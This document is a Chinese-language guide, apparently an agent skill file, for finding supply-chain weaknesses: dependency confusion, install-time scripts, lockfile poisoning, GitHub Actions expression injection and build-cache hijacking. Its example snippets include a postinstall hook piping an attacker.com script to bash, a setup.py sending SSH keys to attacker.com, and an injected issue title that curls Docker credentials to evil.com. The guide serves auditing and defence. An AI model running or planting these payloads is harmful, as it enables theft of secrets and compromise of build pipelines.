---
description: 供应链漏洞挖掘 - 第一性原理驱动的追问链与攻击链闭合
tags: [supply-chain, vuln-hunter, dependency-confusion, install-execution, lockfile-poisoning, ci-cd-poisoning, cache-hijacking]
---

# 供应链漏洞挖掘 (Vuln Hunter): 追问链驱动的攻击链闭合

> 供应链漏洞不是"找出来的"，是"推出来的"。
> 你从第一性原理出发，提出一连串无法被轻易否定的问题，最终逼迫系统承认：是的，这里确实可以被攻陷。

## 原理一：Dependency Confusion —— 名称解释权的争夺

### 触发器
看到项目引用了内部私有包，但包名未加 scope / prefix / 内网域名锁定。

### 追问链（不可绕过的 5 个问题）

1. **这个包名在公网注册表上是否已被占用？**
   - 检测方法：curl `https://registry.npmjs.org/<pkg-name>` 或 `https://pypi.org/pypi/<pkg-name>/json`
   - 如果返回 404 → 这是黄金攻击面。攻击者可以立刻抢注
   - 如果已存在 → 检查版本号。内部用的是 `^1.0.0`，公网最高是 `0.9.0` → 暂时安全但不代表永远安全

2. **包管理器的多源优先级规则是什么？**
   - npm: `registry` 配置只有一个主源，但 `@scope:registry` 可以指定多个。如果没有 scope，所有包都走同一个源
   - pip: `--extra-index-url` 是**并行查询**，不是**优先级查询**。两个源打平找最新版本
   - Maven: `repositories` 列表按顺序查询，但 `mirrorOf` 配置可能意外覆盖
   - cargo: `registries` 有明确名称，但 `dependencies` 中的 `registry = "..."` 是否被显式指定？

3. **版本号解析规则是否允许公网高版本覆盖内部包？**
   - `^1.0.0` 允许 `1.x.x`，但不允许 `2.0.0`
   - `>=1.0.0` 允许任何更高版本，包括 `999.0.0`
   - `*` 或空版本范围 = 取最新版 = 致命
   - **攻击链闭合**：攻击者在公网发布 `999.0.0` → 包管理器解析时选择最高版本 → 恶意代码进入构建

4. **是否有 lockfile 阻止版本漂移？**
   - 有 lockfile 但使用 `npm install` → lockfile 会被更新，攻击者只需让 CI 执行 `npm install`
   - 有 lockfile 且使用 `npm ci` → lockfile 严格锁定，但 lockfile 本身可被投毒（见原理三）
   - 无 lockfile → 每次构建都是俄罗斯轮盘赌

5. **OSV 报告是否显示这个包有已知 CVE？**
   - 如果 OSV 报告 `package-name` 有 critical CVE，且项目版本低于修复版本 → 这是"已知漏洞 + 可升级覆盖"的组合拳
   - 攻击者可以在公网发布"修复版"（带有后门）来"帮助"项目升级

### 典型代码模式与警觉点

```json
// 🚨 高危：无 scope 的内部包名 + 宽松版本范围
{
  "dependencies": {
    "internal-auth-lib": "^1.2.0",
    "company-utils": ">=2.0.0"
  }
}
```

```ini
# 🚨 高危：pip 多源并行查询，无作用域隔离
[global]
index-url = https://internal.pypi.company.com/simple
extra-index-url = https://pypi.org/simple
```

```toml
# ✅ 相对安全：scope 锁定 + registry 显式绑定
[dependencies]
"@company/auth" = { version = "1.2.0", registry = "company-internal" }
```

---

## 原理二：Execution as Install Side-Effect —— 安装即执行

### 触发器
看到 `package.json` 的 `scripts` 字段、`setup.py` 的 `cmdclass`、`Cargo.toml` 的 `build.rs`、Maven 的 plugin `execution`。

### 追问链（不可绕过的 5 个问题）

1. **安装这个包时，什么代码会无条件执行？**
   - npm: `preinstall` → `install` → `postinstall` → `prepare`。这些在 `npm install` 时自动执行
   - pip: `setup.py` 中的 `cmdclass` 自定义命令、`pyproject.toml` 的 `build-backend` 任意代码
   - cargo: `build.rs` 在编译前执行，无沙箱，有网络访问权限
   - Maven: plugin 的 `<execution>` 在特定 lifecycle 阶段绑定，可以执行任意 Java 代码

2. **用户是否意识到安装 = 执行？**
   - 开发者通常认为 `pip install requests` 只是下载文件
   - 实际上，`requests` 的 `setup.py` 可以包含 `os.system('curl evil.com | bash')`
   - **这是设计层面的信任断裂**：安装行为应该 ≠ 执行行为，但多数包管理器默认如此

3. **是否有机制可以禁用安装时脚本？**
   - npm: `--ignore-scripts` 可以禁用，但默认不禁用。CI 中几乎没人加这个 flag
   - pip: 无直接禁用 `setup.py` 执行的 flag。`--no-build-isolation` 反而更危险
   - cargo: 无禁用 `build.rs` 的机制
   - **结论**：默认行为 = 执行，且多数人不知道可以/应该禁用

4. **攻击者控制一个四级传递依赖，能否通过钩子实现 RCE？**
   - 项目 A → 依赖 B → 依赖 C → 依赖 D（恶意）
   - D 的 `package.json` 中 `"postinstall": "node steal-secrets.js"`
   - 开发者执行 `npm install` 时，D 的 postinstall 自动执行
   - **攻击链闭合**：控制深层依赖 → 生命周期钩子执行 → 任意代码在开发者机器/CI 上运行

5. **OSV 报告中的 CVE 是否涉及 install-time 执行漏洞？**
   - 某些 CVE 专门利用 `postinstall` 或 `setup.py` 的漏洞
   - 如果 OSV 报告受影响的包有此类 CVE，攻击面从"理论可能"变为"已有公开利用"

### 典型代码模式与警觉点

```json
// 🚨 高危：postinstall 执行任意网络脚本
{
  "name": "utils-helper",
  "scripts": {
    "postinstall": "curl -fsSL https://attacker.com/setup.sh | bash"
  }
}
```

```python
# 🚨 高危：setup.py 中的任意代码执行
from setuptools import setup
import os

os.system("curl -d @~/.ssh/id_rsa https://attacker.com/collect")

setup(name="helper-lib", version="1.0.0")
```

```bash
# 🚨 高危：CI 中执行 npm install 而不加 --ignore-scripts
- name: Install dependencies
  run: npm install  # 所有 postinstall 脚本都会执行
```

---

## 原理三：Lockfile Poisoning —— 锁定文件的人眼不可审查性

### 触发器
lockfile 出现在 PR 变更中，或 lockfile 中的 `resolved` URL / `integrity` hash 发生变化。

### 追问链（不可绕过的 5 个问题）

1. **这个 lockfile 变更是否可被人类有效审查？**
   - `package-lock.json` 动辄 5000+ 行，一个依赖变更可能引发 2000 行 diff
   - 审查者通常只扫一眼，"看起来是 lockfile 更新"就点 approve
   - **关键漏洞**：恶意修改可以隐藏在巨大的 diff 噪音中

2. **resolved URL 是否指向可信域名？**
   - 检查 `resolved` 字段：`"resolved": "https://npm.attacker.com/package.tgz"`
   - 攻击者可以 fork 一个合法包，修改后在恶意域名发布，然后修改 lockfile 指向它
   - 或者更隐蔽：利用 typosquatting 域名，如 `registry.npmjs.org` → `registry.npmjs.com`

3. **integrity hash 是否与包的公开版本匹配？**
   - 从官方 registry 下载同一版本的包，计算 hash，与 lockfile 中的比对
   - 如果不匹配 → 这个 lockfile 指向的包内容已被篡改
   - 工具辅助：`npm audit` 不校验 hash，`npm ci` 会校验但只校验下载后的 hash

4. **lockfile 的变更来源是否可信？**
   - Dependabot / Renovate bot 自动提交的 lockfile 更新 → 信任链依赖 bot 的配置
   - 人工提交 → 审查者需要逐行检查，实际上做不到
   - 攻击者可以直接提交 PR 修改 lockfile，如果项目使用 `npm install` 而不是 `npm ci`，lockfile 可能被覆盖

5. **OSV 报告的已知 CVE 修复是否通过 lockfile 更新引入？**
   - "修复 CVE" 的 PR 通常会更新 lockfile
   - 攻击者可以伪装成"安全修复"PR，在 lockfile 中夹带恶意 resolved URL
   - 审查者因为"这是安全修复"而降低警惕

### 典型代码模式与警觉点

```json
// 🚨 高危：lockfile 中 resolved URL 指向非官方域名
{
  "node_modules/some-lib": {
    "version": "1.2.3",
    "resolved": "https://unpkg.com/some-lib@1.2.3",
    "integrity": "sha512-abc123..."
  }
}
```

```diff
// 🚨 高危：PR 中 lockfile 的巨大 diff，其中夹带恶意修改
- 2000 行 diff，大部分是版本升级
- 但其中有 3 行修改了一个深层依赖的 resolved URL 和 integrity hash
- 审查者几乎不可能发现
```

---

## 原理四：CI/CD Pipeline Poisoning —— 流水线的混淆代理决堤

### 触发器
看到 CI 配置中使用了 `pull_request_target`、用户可控表达式（`${{ github.event.* }}`）、或直接拼接 shell 命令。

### 追问链（不可绕过的 6 个问题）

1. **触发器的权限边界是什么？**
   - `pull_request`：外部 fork 的 PR 在受限上下文中运行，无 secrets 访问
   - `pull_request_target`：在目标仓库上下文中运行，有 secrets 访问 + 写权限
   - `issue_comment` + `if: contains(github.event.comment.body, '/test')`：任何人评论触发

2. **checkout 的是哪个 ref？**
   - `actions/checkout@v3` 默认 checkout merge commit（`refs/pull/xx/merge`）
   - 但如果加了 `ref: ${{ github.event.pull_request.head.sha }}` → checkout PR 作者的代码
   - `pull_request_target` + checkout PR head = 在拥有 secrets 的环境中执行不可信代码

3. **是否有用户可控输入直接注入 shell 命令？**
   - `run: npm test --grep="${{ github.event.issue.title }}"`
   - Issue title = `foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar`
   - YAML 模板渲染后：`npm test --grep="foo"; curl -d @/home/runner/.docker/config.json https://evil.com; echo "bar"`
   - **攻击链闭合**：用户控制输入 → YAML 模板替换 → shell 命令注入 → Runner 执行任意命令

4. **Runner 环境中暴露了哪些 secrets？**
   - `GITHUB_TOKEN`：默认有写权限（可 push 代码、创建 release）
   - `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`：云资源完全访问
   - `DOCKER_PASSWORD`：镜像仓库访问
   - `KUBECONFIG`：Kubernetes 集群访问
   - 检查 `.github/workflows/*.yml` 中 `env:` 和 `secrets.*` 的使用位置

5. **workflow 的 stdout / artifact 是否可被外部读取？**
   - 如果 Runner 执行了 `env` 或 `cat $GITHUB_ENV`，输出会出现在公开的 Action logs 中
   - 攻击者不需要 exfiltration，只需要看公开日志就能获取 secrets
   - Artifact 上传到 GitHub Releases / S3 / 其他位置，是否包含敏感文件？

6. **OSV 报告的已知 CVE 是否影响 CI 中使用的工具或 action？**
   - 例如 `actions/checkout@v2` 有已知漏洞，`setup-node@v1` 有缓存投毒漏洞
   - 如果 OSV 报告 CI 工具链中的 CVE，攻击面从"配置错误"升级为"已知可利用漏洞"

### 典型代码模式与警觉点

```yaml
# 🚨 高危：pull_request_target + checkout PR head = 不可信代码在特权环境执行
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 不可信代码！
      - run: npm test  # 在拥有 GITHUB_TOKEN 的环境中执行
```

```yaml
# 🚨 高危：表达式注入 - 用户输入直接进入 shell 上下文
- name: Run tests for issue
  run: |
    echo "Testing ${{ github.event.issue.title }}"  # 可被注入
    npm test --grep="${{ github.event.issue.title }}"  # 命令注入
```

```yaml
# 🚨 高危：issue_comment 触发，任何人可触发
on:
  issue_comment:
    types: [created]

jobs:
  deploy:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ github.event.comment.body }}" | sh  # 任意命令执行
```

---

## 原理五：Build Cache Hijacking —— 构筑物缓存的阴魅夺舍

### 触发器
看到 CI 配置中使用了缓存（`actions/cache`、Docker layer cache、`.npm` 全局缓存），且缓存 key 可被预测或影响。

### 追问链（不可绕过的 4 个问题）

1. **缓存的 key 是否可被攻击者影响？**
   - `key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}`
   - 如果攻击者可以修改 `package-lock.json`（通过 PR），就能影响缓存 key
   - 新的 key → 缓存 miss → 构建新缓存 → 攻击者可以在新缓存中植入恶意产物

2. **缓存恢复后是否有完整性校验？**
   - 大多数 CI 缓存机制没有签名或 hash 校验
   - `actions/cache` restore 后直接使用，不验证内容
   - 攻击者可以构造"正常"缓存内容，在其中夹带后门文件

3. **缓存是 runner-local 还是跨 runner 共享？**
   - GitHub Actions 的 cache 是仓库级别的，跨所有 runner 和 workflow 共享
   - 一个 workflow 写入的缓存，另一个 workflow 可以读取
   - 攻击者在 `test.yml` 中污染缓存，`deploy.yml` 恢复并使用 → 生产环境被感染

4. **缓存内容是否包含编译后的产物？**
   - `node_modules` 缓存：包含已安装的包，包括 postinstall 执行后的产物
   - `target/` 缓存：包含 Rust 编译产物，可被替换为带后门的二进制
   - Docker layer cache：base image 层可被替换
   - **攻击链闭合**：攻击者获取 runner 执行权 → 篡改缓存内容 → 后续构建恢复恶意缓存 → 后门进入产物

### 典型代码模式与警觉点

```yaml
# 🚨 高危：缓存无完整性校验，跨 workflow 共享
- uses: actions/cache@v3
  with:
    path: |
      ~/.npm
      node_modules
    key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
```

```yaml
# 🚨 高危：Docker layer cache 无 digest pin
- name: Build Docker image
  run: docker build . --cache-from type=gha
  # 攻击者可以污染 layer cache，后续构建使用恶意 layer
```

---

## 高命中率漏洞 Pattern 速查表

| Pattern | 检测方式 | 典型目标 | 对应原理 |
|---------|---------|---------|---------|
| GitHub Actions 表达式注入 | 搜索 `${{ github.event.*.title/body/head_commit.message }}` | 任何开源项目 | CI/CD Poisoning |
| `pull_request_target` + checkout PR | 搜索 workflow 中两者同时出现 | 任何开源项目 | CI/CD Poisoning |
| npm `postinstall` / `preinstall` RCE | 检查 `package.json` 中 `scripts.postinstall` | npm 生态 | Install Execution |
| pip `setup.py` 任意执行 | 检查 `setup.py` 中 `subprocess.call` / `os.system` / `cmdclass` | PyPI 生态 | Install Execution |
| Lockfile 域名接管 | 提取 lockfile 中所有 `resolved` URL 的域名，检查 DNS 状态 | 所有生态 | Lockfile Poisoning |
| Docker `FROM` 无 digest | 检查 `Dockerfile` 中 `FROM` 是否使用 digest 或精确版本 | 所有项目 | Build Cache Hijacking |
| 内部包名无 scope | 检查依赖声明中是否有未加 `@company/` 前缀的内部包名 | 企业项目 | Dependency Confusion |
| pip `--extra-index-url` | 检查 `pip.conf` / `requirements.txt` 中是否配置了额外源 | Python 项目 | Dependency Confusion |
| CI cache 无签名 | 检查缓存 restore 后是否有内容校验步骤 | 所有项目 | Build Cache Hijacking |
| Maven `repositories` 多源 | 检查 `pom.xml` 中 `repositories` 列表和 `mirrorOf` 配置 | Java 项目 | Dependency Confusion |

## 输出格式

```
## 发现报告

### 原理映射
- 触发原理: [Dependency Confusion / Install Execution / Lockfile Poisoning / CI/CD Poisoning / Build Cache Hijacking]
- 攻击链: [具体的从入口到影响的路径]

### 脆弱路径
- 入口: [PR / Issue / 包发布 / CI配置 / 缓存]
- 攻击者控制点: [哪个文件/字段/参数]
- 最终影响: [窃取secrets / 篡改构建 / 植入后门 / 全公司RCE]

### 验证思路
[如何构造最小 PoC 触发，使用无害 payload 如 echo/curl https://httpbin.org]

### 危害本质
- 影响范围: [单个项目 / 所有使用者 / 整个生态]
- 持续性: [一次性 / 持久化（缓存/lockfile）]

### OSV 协同（如适用）
- 已知 CVE: [CVE-ID]
- 受影响的包: [package-name@version]
- 与发现的重叠: [CVE 提供了已知利用路径，降低了攻击门槛]
```
